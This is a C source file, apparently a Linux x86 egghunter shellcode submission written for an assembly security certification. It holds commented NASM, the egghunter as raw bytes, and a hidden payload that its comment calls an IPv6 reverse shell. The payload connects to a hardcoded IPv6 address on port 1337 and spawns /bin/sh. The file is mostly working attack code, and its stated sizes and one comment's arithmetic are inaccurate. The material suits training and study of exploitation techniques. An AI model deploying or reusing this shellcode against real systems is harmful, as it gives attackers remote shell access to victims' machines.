/*
# Exploit Title: Linux x86 Egghunter Shellcode (94 bytes/null free)
# Date: 2018-08-26
# Shellcode Author: Kevin Kirsche
# Shellcode Repository: https://github.com/kkirsche/SLAE/tree/master/assignment_3-egghunter
# Tested on: Ubuntu 18.04 with gcc 7.3.0

This shellcode has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
Student ID: SLAE-1134

Compilation instructions:
	gcc -o shellcode shellcode.c -fno-stack-protector -z execstack

Commented NASM:
  global _start

  section .text

  _start:
    xor edx, edx        ; we can't use cdq because we don't know the sign of EAX :(
  loop_page:
    ; view your page size with `getconf PAGESIZE`
    ; getconf PAGESIZE == 4096 decimal / 0x1000 hex
    or dx, 0xfff        ; 0xfff hex == 4065 decimal
  next_addr:
    inc edx             ; increment our pointer by one
    lea ebx, [edx+0x4]    ; load where our potential eggs are
    push byte 0x21           ; access system call
    pop eax             ; push / pop used to avoid XOR
    int 0x80            ; check if we have access to the EBX address(es)
    cmp al, 0xf2        ; if 0xf2, we have an EFAULT
    jz loop_page        ; we don't have access :( next page!
  compare:
    mov eax, 0x73676733 ; 3ggs in little-endian, representing our egg!
    mov edi, edx        ; put the address to compare into EDI for the scasd operation
    ; about scasd - https://c9x.me/x86/html/file_module_x86_id_287.html
    scasd               ; if [EDI] == EAX - note: scasd checks a double word (4 bytes) then increments EDI
    jnz next_addr       ; this isn't our egg :( let's move on
    scasd               ; if [EDI] == EAX then we found our egg!
    jnz next_addr       ; nope :( unlucky it seems
  matched:
    jmp edi             ; let's execute our egg!
*/
#include <stdio.h>
#include <string.h>

#define EGG "\x33\x67\x67\x73" // 3ggs

// IPv6 reverse shell from assignment 2 - this represents the payload we'd hide in memory
unsigned char secret[] =  EGG EGG "\x31\xdb\x53\x43\x53\x6a\x0a\x89\xe1\x6a"
  "\x66\x58\xcd\x80\x96\x99\x52\x68\x67\x86\xbe\xb6\x68\xd1\xb8\x2d\x0d\x68"
  "\x5a\x2b\x10\x02\x68\xfd\x15\x4b\xa5\x52\x66\x68\x05\x39\x66\x6a\x0a\x89"
  "\xe1\x6a\x1c\x51\x56\x89\xe1\x43\x43\x6a\x66\x58\xcd\x80\x87\xde\x29\xc9"
  "\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68"
  "\x2f\x62\x69\x6e\x89\xd1\x89\xe3\xb0\x0b\xcd\x80";

unsigned char egghunter[] = "\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04"
  "\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x33\x67\x67\x73\x89\xd7\xaf\x75"
  "\xe9\xaf\x75\xe6\xff\xe7";

int main() {
  printf("Payload egg at: %p\n", secret);
  printf("Egghunter size: %d\n", strlen(egghunter));
  int (*ret)() = (int(*)())egghunter;
	ret();
}
